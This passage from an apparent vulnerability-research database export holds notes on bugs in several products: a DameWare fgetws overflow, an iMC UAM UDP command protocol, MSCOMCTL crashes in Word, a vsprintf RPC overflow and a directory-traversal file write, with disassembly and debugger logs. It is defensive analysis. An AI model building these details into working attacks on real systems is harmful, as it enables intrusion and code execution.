$upload_image_url . \"/\". $image_name;\n\n\t\tif ($new_image['error'] == UPLOAD_ERR_OK && $new_image['size'] > 0) // file is uploaded\n\t\t{\n\t\t\t$return_arr = upload_file($new_image, $upload_image_path_temp, \"temp\");\n\t\t\tif ($return_arr['uploaded'])\n\t\t\t{\n\t\t\t\t$image_name = $return_arr['new_file_name'];\n\t\t\t\t$image_url = $upload_image_url_temp . \"/\". $image_name;\n\t\t\t}\n\t\t}\n\t}\n\n?>\n\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<title>Blocked URL</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" />\n<link rel=\"stylesheet\" href=\"styles/mi5.css\" />\n</head>\n\n<body>\n<div id=\"mainContent\">\n\n<div id=\"mainText\">\n<?php\t\t\t\tif ($image_name == '')\n\t\t\t\t{\n\t\t\t\t\t$image_url = \"images/mi5.gif\";\n\t\t\t\t}\n\n\t\t\t?>\n              <img src=\"<?php echo $image_url . \"?t=\".time(); ?>\" alt=\"Symantec Defense Centre\" style=\"border: 1px solid #ddd;\" /> <hr noshade=\"noshade\" size=\"1\" style=\"margin-bottom: 10px;\" />\n<table><tr><!--<td valign=\"top\" style=\"width: 120px;\">\n\n  <p><a href=\"javascript:history.go(-1);\">&laquo; Previous Page</a></p>\n\n</td>-->\n\n<td style=\"padding-left: 15px; border-left: 1px solid #999;\">\n<h3>Symantec Enterprise Spygate</h3>\n<h1>Accessing web pages from this URL is prohibited</h1>\n  <p><?php echo $before_url; ?> %%URL%%<?php echo $after_url; ?></p>\n\n<p>If you think this spyware detection was in error, please click here.</p>\n\n</td></tr></table>\n\n</div>\n<div class=\"copyright\">&copy; Copyright 2004-2006, Symantec</div>\n</div>\n\n\n</body>\n</html>\n```\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "e287e256-2489-49f8-853f-1f5e02f6baf3",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "821ae548-b825-4b12-81dd-1e6166622311",
      "created": "2019-09-12T18:07:26.121125Z",
      "revisionDate": "2020-02-13T17:12:16.119357Z",
      "document": "\n\nVersion analyzed: DameWare Support Control 10.0.0.372\n\nVulnerability is due to the insecure usage of fgetws\n\n````\n.text:0040D6AA                 push    edi             ; FILE *\n.text:0040D6AB                 lea     ecx, [esp+2234h+var_2010]\n.text:0040D6B2                 push    1FF0h           ; int\n.text:0040D6B7                 push    ecx             ; wchar_t *\n.text:0040D6B8                 call    _fgetws         ; bof here!\n```\n\nLater also in a loop:\n\n```\nwhile ( fgetws(&v20, 8176, v3) );\n```\n\nUnfortunately, no success searching for valid UNICODE pointers for ppr:\n\n```\n!py mona seh -all , manual exam of the results, any UNICODE compliant pointer :\\\n```\n\nVulnerable function is protected by stack cookies.\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "1d2c25d6-ade8-4680-a1c8-d79dfd295a26",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "3d9171e8-3bf8-4404-a3cd-f60dd9fe97d9",
      "created": "2019-09-12T18:07:26.728109Z",
      "revisionDate": "2020-02-13T17:12:15.917309Z",
      "document": "-|\n```\n\nUDP 1810 = UAM background port for listening to commands from the foreground\n\n```\n0042E597   . FF15 5C015800  CALL DWORD PTR DS:[<&WS2_32.#2>]         ; \\bind\n\nEach recvfrom() receives a max of 4132 bytes\n0042E6A8   . 52             PUSH EDX                                 ; /pFromLen\n0042E6A9   . 50             PUSH EAX                                 ; |pFrom\n0042E6AA   . 53             PUSH EBX                                 ; |Flags\n0042E6AB   . 8D8C24 BC7B000>LEA ECX,DWORD PTR SS:[ESP+7BBC]          ; |\n0042E6B2   . 68 24100000    PUSH 1024                                ; |BufSize = 1024 (4132.)\n0042E6B7   . 51             PUSH ECX                                 ; |Buffer\n0042E6B8   . 57             PUSH EDI                                 ; |Socket\n0042E6B9   . C78424 0C01000>MOV DWORD PTR SS:[ESP+10C],10            ; |\n0042E6C4   . FF15 6C015800  CALL DWORD PTR DS:[<&WS2_32.#17>]        ; \\recvfrom\n\nAfter the packet is received, it begins to check the packet size:\n0042E6F8   > 81FE 00100000  CMP ESI,1000                             ;If larger than 0x1000, bounce\n0042E6FE   . 0F8F E12F0000  JG uam.004316E5\n0042E704   . 83FE 14        CMP ESI,14                               ;If less than 0x14, bounce\n```\n\nAfter the packet gets past the size checks, it checks for a \"Command ID\":\n\n```\n0042E850   . 817D 00 213D10>CMP DWORD PTR SS:[EBP],F7103D21\n```\n\nWhen the \"Command ID\" matches, it begins checking the \"Command Type\":\n\n```\n0042E85F   . E8 D42BFDFF    CALL uam.00401438                        ;  Extract command type\n```\n\nThe following \"Command Types\" are available:\n\n```\n0x101 = Echo request              (See 0x0042E88B)\n0x102 = Echo reply                (See 0x0042E899)\n0x201 = Restart command           (See 0x0042E87A)\n0x202 = Stop command              (See 0x0042E95D)\n0x303 = get user offline command  (See 0x0042E9D6)\n0x401 = Re-configure plat request (See 0x0042E9E1)\n0x501 = get pause resume command  (See 0x0042E9C5)\n0x601 = user payment command      (See 0x00431563)\n```\nSome settings related to logging that can trigger different code paths (ead.TBL_PARAMETE):\n\n```\n1020\tPUB_LOG_STORE_TIME\t1\t30\tDays\t1\t365\tLog Lifetime\n1310\tENABLE_AUTH_FAIL_SYSLOG\t1\t0\tNULL\t0\t1\tIf enable sending the syslog of authentication failed\n1311\tENABLE_SAFELOG_SYSLOG\t1\t0\tNULL\t0\t1\tIf enable sending the syslog of safelog\n1312\tSYSLOG_SERVER_IP\t2\t \tNULL\t0\t4294967295\tsyslog server IP\n2060\tEAD_LOG_ATT_SUCCEED\t1\t0\tNULL\t0\t1\tIf Log Successful Authentication(1-Yes;0-No)\n2070\tEAD_LOG_CLEAN_VIRUS\t1\t1\tNULL\t0\t1\tIf Log Virus Cleanup on Client(1-Yes;0-No)\n2170\tEAD_LOG_LEVEL\t1\t3\tNULL\t0\t4\tPolicy Server Log Level\n3000\tEAD_REPORT_SAFE_LOG\t1\t1\tNULL\t0\t1\tIf the safe log is reported , 1: yes , 0: no\n3020\tPUB_LOG_LEVEL\t1\t2\tNULL\t0\t4\tLog Level\n3030\tPUB_LOG_PATH\t3\tC:\\Program Files\\iMC\\uam\\log\tNULL\tNULL\tNULL\tLog File Path\n3040\tPUB_LOG_RESERVE_TIME\t1\t30\tDays\t1\t365\tLog And Backup File Lifetime\n3100\tPORTAL_SERVER_LOG_LEVEL\t1\t3\tNULL\t1\t6\tPortal Log Level\n3110\tPORTAL_SERVER_LOG_PATH\t3\tC:\\Program Files\\iMC\\portal\\logs\\\tNULL\tNULL\tNULL\tPortal Log File Path\n3140\tPORTAL_LOG_LIST_LENGTH\t1\t1000\tNULL\t1\t65535\tPortal Log Queue Length\n3170\tPUB_AUTH_FAIL_LOG_TIME\t1\t90\tday\t1\t365\tAuth Fail Log reserve Time\n3320\tPUB_ENDUSER_MODIFY_PASSWD_LIMIT\t0\t0\tNULL\t0\t1\tAllow User Login(1-YES;0-NO)\n4053\tSSV_TOP_LOGO\t3\tlogin_3com.gif\tNULL\tNULL\tNULL\tthe top image name in the first page of SSV\n4054\tSSV_BOTTOM_LOGO\t3\t3com_about.gif\tNULL\tNULL\tNULL\tthe bottom image name in the first page of SSV\n4055\tSSV_ABOUT_LOGO\t3\tlogo_top_3com.gif\tNULL\tNULL\tNULL\tthe top logo name in the page after a user logging in\n7008\tMSCHAPV2_LOG_LEVEL\t3\t3\tNULL\tNULL\tNULL\tMSChapV2 log level\n```\n\nAn example of how to update a setting:\n\n```\nUPDATE [ead].[ead].[TBL_PARAMETER] SET VALUE=5 where PARAMETER_NAME='PUB_LOG_LEVEL'\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "17918e0a-d9a0-47ec-8133-0a33deeb9b14",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "4df5ef01-8cc5-4a65-87f7-e627faa3f022",
      "created": "2019-09-12T18:07:27.562652Z",
      "revisionDate": "2020-02-13T17:12:15.676258Z",
      "document": "\n\nTo trigger this:\n1. Open the poc with Microsoft Word 2003\n2. Close Microsoft Word, that's when the crash is triggered.\n\n\n```\n0:000> r\neax=056ef534 ebx=00000000 ecx=00000000 edx=02ac0007 esi=0571c18c edi=00000000\neip=2758fce3 esp=0012e348 ebp=0012e3f4 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210212\nMSCOMCTL!DllGetClassObject+0x8f9f:\n2758fce3 ff5108          call    dword ptr [ecx+8]    ds:0023:00000008=????????\n0:000> k\nChildEBP RetAddr\nWARNING: Stack unwind information not available. Following frames may be wrong.\n0012e3f4 650cd2e2 MSCOMCTL!DllGetClassObject+0x8f9f\n0012e40c 650cd052 VBE6!rtcSendKeys+0x1d442\n00000000 00000000 VBE6!rtcSendKeys+0x1d1b2\n\nMSCOMCTL!DllGetClassObject+0x8f91:\n2758fcd5 57              push    edi\n2758fcd6 8b7828          mov     edi,dword ptr [eax+28h]\n2758fcd9 8b481c          mov     ecx,dword ptr [eax+1Ch]\n2758fcdc 895848          mov     dword ptr [eax+48h],ebx\n2758fcdf 83c01c          add     eax,1Ch\n2758fce2 50              push    eax\n2758fce3 ff5108          call    dword ptr [ecx+8]\n\n0:000> dc eax\n056faeb4  00000000 00000000 00000000 00000000  ................\n056faec4  31005c00 00000000 693f3800 44001029  .\\.1.....8?i)..D\n056faed4  4d55434f 00317e45 03004400 00000000  OCUME~1..D......\n056faee4  3c3f37be eb4118bd 000014a6 6f004400  .7?<..A......D.o\n056faef4  75006300 65006d00 74006e00 20007300  .c.u.m.e.n.t.s.\n056faf04  6e006100 20006400 65005300 74007400  .a.n.d. .S.e.t.t\n056faf14  6e006900 73006700 18000000 00000000  .i.n.g.s........\n056faf24  00000000 00130010 010c017a 0018e920  ........z... ...\n```\n\nNote:\nThis crash is different than CVE-2012-0158, despite the fact they both target the same component.\nCVE-0158 is due to a memcpy call, and then retn to the user-controlled stack.  However, this PoC\nleverages from a CALL [ECX+8] call.\n\n* Using samples provided by nex\n\n071cb2398e5b6ad9e965c4191443227166861129eb4aca6fc1fc647b85eb91d6\n\nOffice 2003 crash:\n\n```\n0:004> sxe ld mscomctl\n0:004> g\nModLoad: 27580000 27685000   C:\\WINDOWS\\system32\\MSCOMCTL.OCX\neax=00000000 ebx=00000000 ecx=02bd0000 edx=7c90e4f4 esi=00000000 edi=00000000\neip=7c90e4f4 esp=0011fe58 ebp=0011ff4c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246\nntdll!KiFastSystemCallRet:\n7c90e4f4 c3              ret\n0:000> u 2758fce3\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\MSCOMCTL.OCX -\nMSCOMCTL!DllGetClassObject+0x8f9f:\n2758fce3 ff5108          call    dword ptr [ecx+8]\n2758fce6 3bfb            cmp     edi,ebx\n2758fce8 8bc7            mov     eax,edi\n2758fcea 75ea            jne     MSCOMCTL!DllGetClassObject+0x8f92 (2758fcd6)\n2758fcec 5f              pop     edi\n2758fced ebd1            jmp     MSCOMCTL!DllGetClassObject+0x8f7c (2758fcc0)\n2758fcef 56              push    esi\n2758fcf0 57              push    edi\n0:000> bp 2758fce3\n0:000> g\nBreakpoint 0 hit\neax=01d028a4 ebx=00000000 ecx=2759e3e8 edx=fffffd37 esi=00211ca4 edi=00000000\neip=2758fce3 esp=001213f8 ebp=00121434 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212\nMSCOMCTL!DllGetClassObject+0x8f9f:\n2758fce3 ff5108          call    dword ptr [ecx+8]    ds:0023:2759e3f0=a0255827\n```\n\nAnother crash, with interesting stack??\n\n```\n0:000> kb\nChildEBP RetAddr  Args to Child\nWARNING: Stack unwind information not available. Following frames may be wrong.\n00125fb8 30e5982d 01ee0010 3144c8a5 01ee0070 mso!Ordinal2669+0x5f\n00125fe0 31443f75 01ee0070 00010000 001260d0 mso!Ordinal2669+0x18\n00126000 311a5a49 01ee0010 001260d0 012d0920 mso!Ordinal530+0x352\n00126020 311a5f47 001260d0 01c0687c 012d075c mso!Ordinal2690+0x1ac\n0012603c 306063d0 012d0920 001260d0 30161ba0 mso!Ordinal2690+0x6aa\n00126058 30161a59 001260b0 00000000 00000000 WINWORD!wdCommandDispatch+0x1d695\n0012608c 30609242 001260b0 000000d2 00a20394 WINWORD+0x161a59\n001261b0 7c80ae80 30c90000 00000000 30c90000 WINWORD!wdCommandDispatch+0x20507\n0012622c 7c80ae6e 00126254 7c80ae80 30c90000 kernel32!GetProcAddress+0x5b\n00126254 00126244 30c90000 0012f904 30ed90c6 kernel32!GetProcAddress+0x43\n0012626c 30e59897 30e5982d 00a20178 30e5979a 0x126244 <====\n00126270 30e5982d 00a20178 30e5979a 00a353a4 mso!Ordinal2669+0x82\n00126278 30e5979a 00a353a4 000000d8 300d9800 mso!Ordinal2669+0x18\n00126294 3018c671 00000001 000000d8 000000c8 mso!Ordinal2402+0x13\n001262ac 3060295c 00000000 00000003 00a20178 WINWORD+0x18c671\n001262d4 3060958f 30609596 00126308 00000000 WINWORD!wdCommandDispatch+0x19c21\n00126338 304c7d41 01c05c78 00000001 00000000 WINWORD!wdCommandDispatch+0x20854\n00126354 3003caf0 00000003 00000001 00000001 WINWORD+0x4c7d41\n00000000 00000000 00000000 00000000 00000000 WINWORD+0x3caf0\n```\n\nOffice 2007 crash\n\n```\nMicrosoft (R) Windows Debugger Version 6.2.8400.0 X86\nCopyright (c) Microsoft Corporation. All rights reserved.\n\n*** wait with pending attach\nSymbol search path is: *** Invalid ***\n****************************************************************************\n* Symbol loading may be unreliable without a symbol search path.           *\n* Use .symfix to have the debugger choose a symbol path.                   *\n* After setting your symbol path, use .reload to refresh symbol locations. *\n****************************************************************************\nExecutable search path is:\nModLoad: 30000000 30057000   C:\\Program Files\\Microsoft Office\\Office12\\WINWORD.EXE\nModLoad: 7c900000 7c9af000   C:\\WINDOWS\\system32\\ntdll.dll\nModLoad: 7c800000 7c8f6000   C:\\WINDOWS\\system32\\kernel32.dll\nModLoad: 78130000 781cb000   C:\\WINDOWS\\WinSxS\\x86_Microsoft.VC80.CRT_1fc8b3b9a1e18e3b_8.0.50727.42_x-ww_0de06acd\\MSVCR80.dll\nModLoad: 77c10000 77c68000   C:\\WINDOWS\\system32\\msvcrt.dll\nModLoad: 31240000 322ec000   C:\\Program Files\\Microsoft Office\\Office12\\wwlib.dll\nModLoad: 77dd0000 77e6b000   C:\\WINDOWS\\system32\\ADVAPI32.dll\nModLoad: 77e70000 77f02000   C:\\WINDOWS\\system32\\RPCRT4.dll\nModLoad: 77fe0000 77ff1000   C:\\WINDOWS\\system32\\Secur32.dll\nModLoad: 77f10000 77f59000   C:\\WINDOWS\\system32\\GDI32.dll\nModLoad: 7e410000 7e4a1000   C:\\WINDOWS\\system32\\USER32.dll\nModLoad: 774e0000 7761d000   C:\\WINDOWS\\system32\\ole32.dll\nModLoad: 3a9d0000 3b750000   C:\\Program Files\\Microsoft Office\\Office12\\oart.dll\nModLoad: 32600000 33618000   C:\\Program Files\\Common Files\\Microsoft Shared\\office12\\mso.dll\nModLoad: 3fde0000 40221000   C:\\WINDOWS\\system32\\msi.dll\nModLoad: 33d00000 33dd7000   C:\\Program Files\\Microsoft Office\\Office12\\1033\\wwintl.dll\nModLoad: 773d0000 774d3000   C:\\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\Comctl32.dll\nModLoad: 77f60000 77fd6000   C:\\WINDOWS\\system32\\SHLWAPI.dll\nModLoad: 74720000 7476c000   C:\\WINDOWS\\system32\\MSCTF.dll\nModLoad: 00cc0000 01314000   C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE12\\MSORES.DLL\nModLoad: 6bdc0000 6be7a000   C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE12\\MSPTLS.DLL\nModLoad: 7c9c0000 7d1d7000   C:\\WINDOWS\\system32\\SHELL32.DLL\nModLoad: 5d090000 5d12a000   C:\\WINDOWS\\system32\\comctl32.dll\nModLoad: 01bf0000 025cd000   C:\\Program Files\\Common Files\\Microsoft Shared\\office12\\1033\\MSOINTL.DLL\nModLoad: 79000000 7904a000   C:\\WINDOWS\\system32\\mscoree.dll\nModLoad: 603b0000 60416000   C:\\WINDOWS\\Microsoft.NET\\Framework\\v4.0.30319\\mscoreei.dll\nModLoad: 77c00000 77c08000   C:\\WINDOWS\\system32\\VERSION.DLL\nModLoad: 73000000 73026000   C:\\WINDOWS\\system32\\Winspool.DRV\nModLoad: 7e660000 7e715000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\PS5UI.DLL\nModLoad: 77120000 771ab000   C:\\WINDOWS\\system32\\OLEAUT32.dll\nModLoad: 5ad70000 5ada8000   C:\\WINDOWS\\system32\\UxTheme.DLL\nModLoad: 3a780000 3a889000   C:\\Program Files\\Common Files\\Microsoft Shared\\office12\\riched20.dll\nModLoad: 76fd0000 7704f000   C:\\WINDOWS\\system32\\CLBCATQ.DLL\nModLoad: 77050000 77115000   C:\\WINDOWS\\system32\\COMRes.dll\nModLoad: 78800000 7895c000   C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE11\\msxml5.dll\nModLoad: 77920000 77a13000   C:\\WINDOWS\\system32\\SETUPAPI.dll\nModLoad: 02dd0000 03095000   C:\\WINDOWS\\system32\\xpsp2res.dll\nModLoad: 3bd10000 3bea5000   C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE12\\OGL.DLL\nModLoad: 76f50000 76f58000   C:\\WINDOWS\\system32\\WTSAPI32.DLL\nModLoad: 76360000 76370000   C:\\WINDOWS\\system32\\WINSTA.dll\nModLoad: 5b860000 5b8b5000   C:\\WINDOWS\\system32\\NETAPI32.dll\nModLoad: 73ba0000 73bb3000   C:\\WINDOWS\\system32\\sti.dll\nModLoad: 74ae0000 74ae7000   C:\\WINDOWS\\system32\\CFGMGR32.dll\nModLoad: 7e1e0000 7e282000   C:\\WINDOWS\\system32\\urlmon.dll\nModLoad: 6bd10000 6bd24000   C:\\Program Files\\Microsoft Office\\Office12\\MSOHEV.DLL\nModLoad: 40390000 40446000   C:\\Program Files\\Microsoft Office\\Office12\\msproof6.dll\nModLoad: 7c420000 7c4a7000   C:\\WINDOWS\\WinSxS\\x86_Microsoft.VC80.CRT_1fc8b3b9a1e18e3b_8.0.50727.42_x-ww_0de06acd\\MSVCP80.dll\nModLoad: 7e720000 7e7d0000   C:\\WINDOWS\\system32\\SXS.DLL\n(a7c.b3c): Break instruction exception - code 80000003 (first chance)\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\ntdll.dll -\neax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\neip=7c90120e esp=03f3ffcc ebp=03f3fff4 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\nntdll!DbgBreakPoint:\n7c90120e cc              int     3\n0:007> g\nModLoad: 77b40000 77b62000   C:\\WINDOWS\\system32\\appHelp.dll\nModLoad: 77a20000 77a74000   C:\\WINDOWS\\System32\\cscui.dll\nModLoad: 76600000 7661d000   C:\\WINDOWS\\System32\\CSCDLL.dll\nModLoad: 75f80000 7607d000   C:\\WINDOWS\\system32\\browseui.dll\nModLoad: 76990000 769b5000   C:\\WINDOWS\\system32\\ntshrui.dll\nModLoad: 76b20000 76b31000   C:\\WINDOWS\\system32\\ATL.DLL\nModLoad: 769c0000 76a74000   C:\\WINDOWS\\system32\\USERENV.dll\nModLoad: 7e290000 7e401000   C:\\WINDOWS\\system32\\SHDOCVW.dll\nModLoad: 77a80000 77b15000   C:\\WINDOWS\\system32\\CRYPT32.dll\nModLoad: 77b20000 77b32000   C:\\WINDOWS\\system32\\MSASN1.dll\nModLoad: 754d0000 75550000   C:\\WINDOWS\\system32\\CRYPTUI.dll\nModLoad: 771b0000 7725a000   C:\\WINDOWS\\system32\\WININET.dll\nModLoad: 76c30000 76c5e000   C:\\WINDOWS\\system32\\WINTRUST.dll\nModLoad: 76c90000 76cb8000   C:\\WINDOWS\\system32\\IMAGEHLP.dll\nModLoad: 76f60000 76f8c000   C:\\WINDOWS\\system32\\WLDAP32.dll\nModLoad: 76980000 76988000   C:\\WINDOWS\\system32\\LINKINFO.dll\nModLoad: 27580000 27685000   C:\\WINDOWS\\system32\\MSCOMCTL.OCX\nModLoad: 763b0000 763f9000   C:\\WINDOWS\\system32\\comdlg32.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 42640000 426c7000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\PSCRIPT5.DLL\nModLoad: 73b30000 73b45000   C:\\WINDOWS\\system32\\mscms.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\nModLoad: 10000000 1001f000   C:\\WINDOWS\\System32\\spool\\DRIVERS\\W32X86\\3\\tpps.dll\n(a7c.df4): Unknown exception - code e0000002 (first chance)\nModLoad: 65000000 65278000   C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL\nModLoad: 65300000 65326000   C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA6\\1033\\VBE6INTL.DLL\n(a7c.df4): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\MSCOMCTL.OCX -\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\Microsoft Office\\Office12\\wwlib.dll -\neax=001d2d9c ebx=00000000 ecx=000000c4 edx=0237000d esi=0015e484 edi=00000118\neip=2758fce3 esp=00121d10 ebp=00121d64 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nMSCOMCTL!DllGetClassObject+0x8f9f:\n2758fce3 ff5108          call    dword ptr [ecx+8]    ds:0023:000000cc=????????\n0:000> dd ecx\n000000c4  ???????? ???????? ???????? ????????\n000000d4  ???????? ???????? ???????? ????????\n000000e4  ???????? ???????? ???????? ????????\n000000f4  ???????? ???????? ???????? ????????\n00000104  ???????? ???????? ???????? ????????\n00000114  ???????? ???????? ???????? ????????\n00000124  ???????? ???????? ???????? ????????\n00000134  ???????? ???????? ???????? ????????\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "91933be1-05fb-46f9-b515-c37b75848bad",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "805f2e7a-a864-4917-992a-dbe4465990fb",
      "created": "2019-09-12T18:07:28.870046Z",
      "revisionDate": "2020-02-13T17:12:15.261772Z",
      "document": "\n\nThe stack overflow happens in sub_10004BC8:\n\n```\n.text:10004BC8 ; int __cdecl sub_10004BC8(char *Format, char)\n.text:10004BC8 sub_10004BC8    proc near               ;\n.text:10004BC8                                         ;\n.text:10004BC8\n.text:10004BC8 lpWindowName    = dword ptr -818h\n.text:10004BC8 hWnd            = dword ptr -814h\n.text:10004BC8 lpClassName     = dword ptr -810h\n.text:10004BC8 Args            = dword ptr -80Ch\n.text:10004BC8 lpBaseAddress   = dword ptr -808h\n.text:10004BC8 hFileMappingObject= dword ptr -804h\n.text:10004BC8 Dest            = byte ptr -800h\n.text:10004BC8 Format          = dword ptr  8\n.text:10004BC8 arg_4           = byte ptr  0Ch\n.text:10004BC8\n.text:10004BC8                 push    ebp\n.text:10004BC9                 mov     ebp, esp\n.text:10004BCB                 sub     esp, 818h\n.text:10004BD1                 mov     [ebp+lpWindowName], offset aDebugScreen1    ; \"Debug Screen1\"\n.text:10004BDB                 mov     [ebp+lpClassName], offset aDebugwclass1     ; \"debugWClass1\"\n.text:10004BE5                 lea     eax, [ebp+arg_4]\n.text:10004BE8                 mov     [ebp+Args], eax\n.text:10004BEE                 mov     ecx, [ebp+Args]\n.text:10004BF4                 push    ecx                                         ; Args\n.text:10004BF5                 mov     edx, [ebp+Format]\n.text:10004BF8                 push    edx                                         ; Format\n.text:10004BF9                 lea     eax, [ebp+Dest]\n.text:10004BFF                 push    eax                                         ; Dest\n.text:10004C00                 call    ds:vsprintf                                 ; overflow\n```\n\nThe corresponding IDL is below:\n\n```\n[\n uuid(5d2b62aa-ee0a-4a95-91ae-b064fdb471fc),\n version(1.0)\n]\n\ninterface target_interface\n{\n\n/* opcode: 0x01, address: 0x00401260 */\n\nvoid sub_401260 (\n [in] handle_t  arg_1,\n [in] long  arg_2,\n [in] long  arg_3,\n [in] long  arg_4,\n [in][ref][size_is(arg_4)] char * arg_5,\n [out][ref] long * arg_6\n);\n\n}\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "8cac3ec4-3e83-4762-aa92-8a11492efc58",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "bbd9ac0e-86ca-429b-b453-0d24b6d0124b",
      "created": "2019-09-12T18:07:29.540852Z",
      "revisionDate": "2020-10-21T20:25:28.038707Z",
      "document": "\n\nThe specific flaw exists within the toServerObject function. The method does not properly sanitize the input to this function allowing for directory traversal. An attacker can leverage this vulnerability to write files under the context of SYSTEM and achieve remote code execution.\n\n* The URL to access the web service:\n\n```\npublic static final String WS_NETWORKEDITOR_TO_SERVER_OBJECT_URI = \"/savefile/{filename}\";\n```\n\n* The \"toServerObject\" web service API:\n\n```\npublic ShunraClientResponse toServerObject(String s, UIObject uiobject)\n    throws Exception\n{\n    try\n    {\n        return m_controller.toServerObject(uiobject, s);\n    }\n    catch(Exception exception)\n    {\n        exception.printStackTrace();\n        m_logger.error(exception.getMessage(), exception);\n        throw exception;\n    }\n}\n```\n\nEverything is delegated to :\n\n```\nprivate NetworkEditorController m_controller;\n```\n\n# The NetworkEditorControllerImpl toServerObject:\n\n```\npublic ShunraClientResponse toServerObject(UIObject uiobject, String s)\n{\n    m_logger.debug(\"toServerObject\");\n    FlowValidator flowvalidator = new FlowValidator();\n    try\n    {\n        uiobject.fileName = s;\n        ShunraClientResponse shunraclientresponse = new ShunraClientResponse();\n        ErrorMessages errormessages = new ErrorMessages();\n        if(uiobject.flows.size() == 0)\n            errormessages.generalErrors.add(\"Currently there are no flows to download\");\n        else\n            errormessages = flowvalidator.ValidateCollisionsBetweenFlows(uiobject.flows);\n        if(errormessages.containsErrors())\n        {\n            shunraclientresponse.SetFailure(errormessages);\n        } else\n        {\n            ObjectsConverter objectsconverter = new ObjectsConverter();\n            FilesConverter filesconverter = new FilesConverter();\n            NtxObjectRepresentation ntxobjectrepresentation = objectsconverter.ConvertFromUIObjectToMultiFlowNtx(uiobject);\n            String s1 = filesconverter.ConvertFromObjectToFile(ntxobjectrepresentation);\n    